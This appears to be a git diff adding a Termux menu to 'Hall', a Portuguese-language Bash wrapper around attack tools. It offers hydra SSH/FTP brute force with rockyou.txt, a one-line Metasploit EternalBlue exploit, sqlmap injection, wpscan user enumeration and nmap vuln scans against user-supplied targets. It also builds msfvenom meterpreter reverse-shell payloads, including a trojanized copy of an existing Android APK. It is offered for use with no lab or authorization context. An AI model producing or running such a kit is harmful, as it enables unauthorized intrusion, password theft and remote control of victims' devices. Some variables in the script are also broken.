@@ -8,8 +8,23 @@
 green='\e[0;32m'
 RED='\033[31m'
 NC='\033[0m'
+
 function sistema {
   clear
+
+  echo -e $RED "
+ ██░ ██  ▄▄▄       ██▓     ██▓    
+▓██░ ██▒▒████▄    ▓██▒    ▓██▒    
+▒██▀▀██░▒██  ▀█▄  ▒██░    ▒██░    
+░▓█ ░██ ░██▄▄▄▄██ ▒██░    ▒██░    
+░▓█▒░██▓ ▓█   ▓██▒░██████▒░██████▒
+ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
+ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
+ ░  ░░ ░  ░   ▒     ░ ░     ░ ░   
+ ░  ░  ░      ░  ░    ░  ░    ░  ░
+                                  
+
+"
   echo "Qual seu terminal?: "
   echo "1. Linux"
   echo "2. Termux"
@@ -45,29 +60,535 @@ read -p "Opção: " opcao
 }
 
 function termux {
+  if ! command -v nmap &> /dev/null
+then
+    echo "O nmap não está instalado. Instalando..."
+    pkg install nmap
+fi
+if ! command -v gobuster &> /dev/null
+then
+    echo "O gobuster não está instalado. Instalando..."
+    pkg install gobuster
+fi
+if ! command -v hydra &> /dev/null
+then
+    echo "O hydra não está instalado. Instalando..."
+    pkg install hydra
+fi
+if ! command -v msfconsole &> /dev/null
+then
+    echo "O metasploit não está instalado. Instalando..."
+    pkg install unstable-repo
+    pkg install metasploit
+fi
+if ! command -v wpscan &> /dev/null
+then
+    echo "O wpscan não está instalado. Instalando..."
+    pkg install ruby clang make pkg-config ruby-dev libffi-dev zlib-dev libcurl
+    gem install wpscan
+fi
+if ! command -v sqlmap &> /dev/null
+then
+    echo "O sqlmap não está instalado. Instalando..."
+    pkg install sqlmap
+    echo 'export PATH=$PATH:/data/data/com.termux/files/home/.sqlmap' >> ~/.bashrc
+    source ~/.bashrc
+fi
+
+
   clear
-  echo "ta funcionando"
+  echo -e $RED "▄▄▄█████▓▓█████  ██▀███   ███▄ ▄███▓ █    ██ ▒██   ██▒
+▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒▓██▒▀█▀ ██▒ ██  ▓██▒▒▒ █ █ ▒░
+▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒▓██    ▓██░▓██  ▒██░░░  █   ░
+░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  ▒██    ▒██ ▓▓█  ░██░ ░ █ █ ▒ 
+  ▒██▒ ░ ░▒████▒░██▓ ▒██▒▒██▒   ░██▒▒▒█████▓ ▒██▒ ▒██▒
+  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░
+    ░     ░ ░  ░  ░▒ ░ ▒░░  ░      ░░░▒░ ░ ░ ░░   ░▒ ░
+  ░         ░     ░░   ░ ░      ░    ░░░ ░ ░  ░    ░  
+            ░  ░   ░            ░      ░      ░    ░  
+                                                      
+
+"
+function menu_principal {
+    
+  echo "Selecione uma opção:"
+  echo "1. Escanear portas"
+  echo "2. Diretórios Gobuster"
+  echo "3. Hydra brute force"
+  echo "4. Metasploit"
+  echo "5. SqlMap"
+  echo "6. Wpscan"
+  echo "0. Sair"
+
+  read -p "Opção: " opcao
+  case $opcao in
+    1)
+    clear
+      escanear_portas
+      ;;
+    2)
+    clear
+      diretórios_gobuster
+      ;;
+    3)
+    clear
+      menu_hydra
+      ;;
+    4)
+    clear
+      mtops
+      ;;
+    5)
+    clear
+      sqlops
+      ;;
+    6)clear
+      wpops
+      ;;
+    0)
+        echo -e "╔──────────────────────────────────────────────╗"
+    echo -e "|          Author: B3N1N1 owner Hysec          |"
+    echo -e "|          Hall  - Hysec                       |"
+    echo -e "|          Credits to : B3N1N1                 |"
+    echo -e "|                                              |"
+    echo -e "|   Hall use nmap,gobuster,metaspliot,hydra    |"
+    echo -e "┖──────────────────────────────────────────────┙"
+      exit 0
+      ;;
+    *)
+      clear
+      echo "Opção inválida"
+      sleep 1
+      clear
+      menu_principal
+      ;;
+  esac
+}
+function escanear_portas {
+echo "
+NNNNNN    NNN    MMMMMM    MMMMMM   AAAAAAAAAAAAA   PPPPPPPPPPP
+NNN NNN   NNN    MMM  MM  MM  MMM   AAAAAAAAAAAAA   PPPPPPPPPPP
+NNN  NNN  NNN    MMM   MMMM   MMM   AAA       AAA   PPP     PPP
+NNN   NNN NNN    MMM          MMM   AAAAAAAAAAAAA   PPP     PPP
+NNN    NNNNNN    MMM          MMM   AAAAAAAAAAAAA   PPPPPPPPPPP
+NNN     NNNNN    MMM          MMM   AAA       AAA   PPP
+NNN      NNNN    MMM          MMM   AAA       AAA   PPP
+"
+echo "Selecione um serviço para realizar brute force:"
+echo "1. Scan simples"
+echo "2. Scan agressivo"
+echo "3. Scan Vuln"
+echo "0. Voltar"
+read -p "Opção: " opcao
+    case $opcao in
+        1)
+            simple_scan
+            ;;
+        2)
+            agressive_scan
+            ;;
+        3)
+            scan_vuln
+            ;;
+        0)
+            menu_principal
+            ;;
+        *)
+            
+            clear
+            echo "Opção inválida"
+            sleep 1
+            clear
+            escanear_portas
+            ;;
+    esac
+}
+function simple_scan {
+  echo -n "Insira o ip: "
+  read ip
+  clear
+  echo "Escaneando o ip $ip"
+  sleep 1
+  nmap -sS $ip
+  escanear_portas
+}
+function agressive_scan {
+  echo -n "Insira o ip: "
+  read ip
+  clear
+  echo "Escaneando o ip $ip"
+  sleep 1
+  nmap -A $ip
+  escanear_portas
+}
+function scan_vuln {
+  echo -n "Insira o ip: "
+  read ip
+  clear
+  echo "Escaneando o ip $ip"
+  sleep 1
+  nmap -sV --script=vuln $ip
+  escanear_portas
+}
+function diretórios_gobuster {
+    
+    echo "HHHH     HHHH    TTTTTTTTTTTT    TTTTTTTTTTTT    PPPPPPPPPP          ///
+HHHH     HHHH    TTTTTTTTTTTT    TTTTTTTTTTTT    PPPPPPPPPP         ///
+HHHH     HHHH        TTTT            TTTT        PPP    PPP        ///
+HHHHHHHHHHHHH        TTTT            TTTT        PPP    PPP       ///
+HHHHHHHHHHHHH        TTTT            TTTT        PPPPPPPPPP      ///
+HHHH     HHHH        TTTT            TTTT        PPP            ///
+HHHH     HHHH        TTTT            TTTT        PPP           ///
+HHHH     HHHH        TTTT            TTTT        PPP          ///
+HHHH     HHHH        TTTT            TTTT        PPP         ///
+"
+    echo -n "Qual site ou aplicação? (inclua http/https): "
+    read dir
+    gobuster dir -u $dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,hmtl,txt
+    echo "Você deseja continuar? (s/n)"
+read resposta
+
+if [ "$resposta" == "s" ]; then
+  menu_principal
+elif [ "$resposta" == "n" ]; then
+  echo -e "╔──────────────────────────────────────────────╗"
+    echo -e "|          Author: B3N1N1 owner Hysec          |"
+    echo -e "|          Hall  - Hysec                       |"
+    echo -e "|          Credits to : B3N1N1                 |"
+    echo -e "|                                              |"
+    echo -e "|   Hall use nmap,gobuster,metaspliot,hydra    |"
+    echo -e "┖──────────────────────────────────────────────┙"
+      exit 0
+else
+  echo "Opção inválida."
+  
+fi
+}
+function menu_hydra {
+    
+    echo "⠄⠄⣴⣶⣤⡤⠦⣤⣀⣤⠆⠄⠄⠄⠄⠄⣈⣭⣭⣿⣶⣿⣦⣼⣆⠄⠄⠄⠄⠄⠄⠄⠄
+⠄⠄⠄⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦⠄⠄⠄⠄⠄⠄
+⠄⠄⠄⠄⠄⠈⠄⠄⠄⠈⢿⣿⣟⠦⠄⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄⠄⠄⠄⠄
+⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣸⣿⣿⢧⠄⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿⠄⠄⠄⠄
+⠄⠄⢀⠄⠄⠄⠄⠄⠄⢠⣿⣿⣿⠈⠄⠄⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀⠄⠄
+⠄⠄⢠⣧⣶⣥⡤⢄⠄⣸⣿⣿⠘⠄⠄⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄⠄
+⠄⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷⠄⠄⠄⢊⣿⣿⡏⠄⠄⢸⣿⣿⡇⠄⢀⣠⣄⣾⠄⠄⠄
+⣠⣿⠿⠛⠄⢀⣿⣿⣷⠘⢿⣿⣦⡀⠄⢸⢿⣿⣿⣄⠄⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄⠄
+⠙⠃⠄⠄⠄⣼⣿⡟⠌⠄⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿⠐⣿⣿⡇⠄⠛⠻⢷⣄
+⠄⠄⠄⠄⠄⢻⣿⣿⣄⠄⠄⠄⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠄⠫⢿⣿⡆⠄⠄⠄⠁
+⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃⠄⠄⠄⠄
+⠄⠄⠄⠄⢰⣶⠄⠄⣶⠄⢶⣆⢀⣶⠂⣶⡶⠶⣦⡄⢰⣶⠶⢶⣦⠄⠄⣴⣶⠄⠄⠄⠄
+⠄⠄⠄⠄⢸⣿⠶⠶⣿⠄⠈⢻⣿⠁⠄⣿⡇⠄⢸⣿⢸⣿⢶⣾⠏⠄⣸⣟⣹⣧⠄⠄⠄
+⠄⠄⠄⠄⠸⠿⠄⠄⠿⠄⠄⠸⠿⠄⠄⠿⠷⠶⠿⠃⠸⠿⠄⠙⠷⠤⠿⠉⠉⠿⠆⠄⠄
+
+"
+  echo "Selecione um serviço para realizar brute force:"
+  echo "1. SSH"
+  echo "2. FTP"
+  echo "0. Voltar"
+
+  read -p "Opção: " opcao
+  case $opcao in
+    1)
+      hydra_ssh
+      ;;
+    2)
+      hydra_ftp
+      ;;
+    0)
+      menu_principal
+      ;;
+    *)
+      menu_hydra
+      echo "Opção inválida"
+      ;;
+  esac
+}
+
+function hydra_ssh {
+  echo -n "Qual nome do usuario SSH?: "
+  read users
+  echo -n "Qual ip do alvo?: "
+  read ips
+  echo "Atacando $users com ip $ips"
+  if [ -e "/home/$SUDO_USER/Downloads/rockyou.txt" ]; then
+    hydra -V -l $users -P /home/$SUDO_USER/Downloads/rockyou.txt $ips -t 4 ssh
+else
+    clear
+    echo -e $RED "Coloque a wordlist 'rockyou.txt' na pasta Downloads do seu computador. Dica olhe o README"
+fi
+
+
+  
+}
+
+function hydra_ftp {
+  echo -n "Qual nome do usuario FTP?: "
+  read users
+  echo -n "Qual ip do alvo?: "
+  read ips
+  echo "Atacando $users com ip $ips"
+  if [ -e "/home/$SUDO_USER/Downloads/rockyou.txt" ]; then
+    hydra -V -l $users -P /home/$SUDO_USER/Downloads/rockyou.txt ftp://$ips
+else
+    clear
+    echo -e $RED "Coloque a wordlist 'rockyou.txt' na pasta Downloads do seu computador. Dica olhe o README"
+fi
+  
+}
+
+
+function mtops {
+
+echo "  ----------"
+echo "< metasploit >"
+echo "  ----------"
+echo "      \   ,__,"
+echo "       \  (oo)____"
+echo "          (__)    )\ "
+echo "             ||--|| *"
+echo "Selecione um serviço para realizar brute force:"
+echo "1. Embed APK"
+echo "2. Payload EXE"
+echo "3. Payload APK"
+echo "4. EternalBlue"
+echo "0. Voltar"
+mtcase
+
+}
+function mtcase {
+    read -p "Opção: " opcao
+    case $opcao in
+        1)
+            embed_apk
+            ;;
+        2)
+            payload_exe
+            ;;
+        3)
+            payload_apk
+            ;;
+        4)
+            EternalBlue
+            ;;
+        0)
+            menu_principal
+            ;;
+        *)
+            
+            clear
+            echo "Opção inválida"
+            sleep 1
+            clear
+            mtops
+            ;;
+    esac
+
+
+}
+function EternalBlue {
+  echo -n "Insira o RHOSTS: "
+  read RHOSTS
+  echo -n "Insira o LHOST: "
+  read LHOST
+  echo -n "Insira o LPORT: "
+  read LPORT
+  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $RHOSTS; set LHOST $LHOST; set LPORT $LPORT; exploit"
+}
+function embed_apk {
+  echo -e $RED "
+  COLOQUE O APK ORIGINAL NA PASTA APKS DO HALL
+  "
+  echo -n "Insira seu LHOST:"
+  read LHOST
+  echo -n "Insira seu LPORT:"
+  read LPORT
+  echo -n "Coloque o caminho para o apk(inclua .apk): "
+  read napk
+  echo -n "Como quer que salve seu apk?(inclua .apk): "
+  read nome
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -x $lapk -o $nome
+}
+function payload_exe {
+  echo -n "Insira seu LHOST:"
+  read LHOST
+  echo -n "Insira seu LPORT:"
+  read LPORT
+  echo -n "Como quer que salve seu exe?(inclua .exe): "
+  read nome
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > $nome
+}
+function payload_apk {
+  echo -n "Insira seu LHOST:"
+  read LHOST
+  echo -n "Insira seu LPORT:"
+  read LPORT
+  echo -n "Como quer que salve seu apk?(inclua .apk): "
+  read nome
+  msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $nome
+
+}
+function simple_scan {
+  echo -n "Insira o ip: "
+  read ip
+  clear
+  echo "Escaneando o ip $ip"
+  sleep 1
+  nmap -sS $ip
+  escanear_portas
+}
+function agressive_scan {
+  echo -n "Insira o ip: "
+  read ip
+  clear
+  echo "Escaneando o ip $ip"
+  sleep 1
+  nmap -A $ip
+  escanear_portas
+}
+function scan_vuln {
+  echo -n "Insira o ip: "
+  read ip
+  clear
+  echo "Escaneando o ip $ip"
+  sleep 1
+  nmap -sV --script=vuln $ip
+  escanear_portas
+}
+function sqlops {
+  clear
+  echo "       __H__
+ ___ ___[.]_____ ___ ___  
+|_ -| . [,]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   
+
+"
+ echo "Menu SQLMap"
+    echo "1. Teste de injeção SQL em URL"
+    echo "2. Teste de injeção SQL em parâmetros POST"
+    echo "3. Teste de injeção SQL em cabeçalhos HTTP"
+    echo "0. Voltar"
+
+
+    read -p "Escolha uma opção: " opcao
+
+    case $opcao in
+        1)
+
+            read -p "Digite a URL a ser testada: " url
+
+            sqlmap -u "$url" --batch --random-agent
+            read -n1 -r -p "Pressione qualquer tecla para continuar..."
+            sqlops
+            ;;
+        2)
+
+            read -p "Digite os parâmetros POST: " postdata
+            sqlmap -u "$url" --data "$postdata" --batch --random-agent
+            read -n1 -r -p "Pressione qualquer tecla para continuar..."
+            sqlops
+            ;;
+        3)
+
+            read -p "Digite o cabeçalho HTTP: " header
+
+            sqlmap -u "$url" --headers "$header" --batch --random-agent
+            read -n1 -r -p "Pressione qualquer tecla para continuar..."
+            -e $green sqlops
+            ;;
+        0)
+            menu_principal
+            ;;
+        *)
+            echo "Opção inválida, escolha uma opção válida."
+            sleep 1
+            clear
+            sqlops
+            ;;
+    esac
+}
+function wpops {
+  echo "         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _' | '_ \'
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+"
+  echo "Menu Wpscan"
+    echo "1. Scan wordpress"
+    echo "2. Enumerate users"
+    echo "3. Scan vuln"
+    echo "0. Voltar"
+read -p "Escolha uma opção: " opcao
+
+    case $opcao in
+        1)
+
+            read -p "Digite a URL a ser Scaneada(inclua http/https): " url
+            wpscan --url $url
+            read -n1 -r -p "Pressione qualquer tecla para continuar..."
+            wpops
+            ;;
+        2)
+
+            read -p "Digite a URL a ser enumarada(inclua http/https): " url
+            wpscan --url $url -e u
+            read -n1 -r -p "Pressione qualquer tecla para continuar..."
+            wpops
+            ;;
+        3)
+          read -p "Digite a URL a ser varrida(inclua http/https): " url
+          echo "voce tem um token de api? (s/n)"
+          read resposta
+
+if [ "$resposta" == "s" ]; then
+  echo "token: "
+  read token
+ sudo wpscan --url $url --api-token $token
+elif [ "$resposta" == "n" ]; then
+xdg-open https://wpscan.com/profile &
+else
+clear
+sleep 1
+  echo "Opção inválida."
+  sleep 1
+  wpops
+  
+fi
+;;
+        0)
+            menu_principal
+            ;;
+        *)
+            echo "Opção inválida, escolha uma opção válida."
+            sleep 1
+            clear
+            wpops
+            ;;
+    esac
+
+}
+menu_principal
 }
 function linux {
 function logo {
 clear
-echo -e $green "
+echo -e $RED "
 
-░░░░░░░░░░░░░░░░░░░░░░█████████
-░░███████░░░░░░░░░░███▒▒▒▒▒▒▒▒███
-░░█▒▒▒▒▒▒█░░░░░░░███▒▒▒▒▒▒▒▒▒▒▒▒▒███
-░░░█▒▒▒▒▒▒█░░░░██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
-░░░░█▒▒▒▒▒█░░░██▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒▒███
-░░░░░█▒▒▒█░░░█▒▒▒▒▒▒████▒▒▒▒████▒▒▒▒▒▒██
-░░░█████████████▒▒▒▒▒██▒▒▒▒▒▒██▒▒▒▒▒▒▒██   -----------------------------)
-░░░█▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒██  /                             |
-░██▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒██▒▒▒▒▒▒▒▒▒▒██▒▒▒▒██ <        FUCK THE SYSTEM!      |
-██▒▒▒███████████▒▒▒▒▒██▒▒▒▒▒▒▒▒██▒▒▒▒▒██  \                             |
-█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒████████▒▒▒▒▒▒▒██   -----------------------------)
-██▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
-░█▒▒▒███████████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██
-░██▒▒▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█
-░░████████████░░░█████████████████
+ ██▓     ██▓ ███▄    █  █    ██ ▒██   ██▒
+▓██▒    ▓██▒ ██ ▀█   █  ██  ▓██▒▒▒ █ █ ▒░
+▒██░    ▒██▒▓██  ▀█ ██▒▓██  ▒██░░░  █   ░
+▒██░    ░██░▓██▒  ▐▌██▒▓▓█  ░██░ ░ █ █ ▒ 
+░██████▒░██░▒██░   ▓██░▒▒█████▓ ▒██▒ ▒██▒
+░ ▒░▓  ░░▓  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒▒ ░ ░▓ ░
+░ ░ ▒  ░ ▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░░   ░▒ ░
+  ░ ░    ▒ ░   ░   ░ ░  ░░░ ░ ░  ░    ░  
+    ░  ░ ░           ░    ░      ░    ░  
+                                         
+
 
 "
 }
